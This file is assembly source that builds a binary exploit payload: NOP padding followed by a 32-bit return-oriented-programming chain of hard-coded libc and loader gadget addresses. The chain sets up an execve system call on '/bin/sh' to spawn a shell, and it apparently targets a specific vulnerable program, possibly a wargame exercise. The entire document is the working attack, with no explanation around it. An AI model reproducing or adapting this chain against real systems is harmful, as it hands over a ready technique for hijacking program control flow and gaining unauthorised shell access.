
format binary
use32

db $8C dup $90

libc_start = $B7E2C000
ld_start = $B7FDE000

pop_eax = libc_start + $00023C4F
xor_eax = libc_start + $0012ACB0 ; xor eax, 0x18C483ff ; pop ebx ; ret
xor_edx = libc_start + $00082E65 ; xor edx, edx ; mov eax, edx ; ret
int_80 = libc_start + $0002DEB5
sub_ecx = libc_start + $000F8110 ; sub ecx, eax ; pop ebx ; mov eax, ecx ; pop esi ; pop edi ; pop ebp ; ret
mov_ecx = ld_start + $00018BA7 ; mov ecx, dword ptr [esp] ; ret
got_plt = (pop_eax - $80486E8) and $FFFFFFFF
bin_sh = libc_start + $00160C58

dd mov_ecx
dd pop_eax
dd got_plt
dd sub_ecx
rept $04 { dd $DEADC0DE }
dd xor_edx
dd pop_eax
dd $18C483F4
dd xor_eax
dd bin_sh
dd int_80

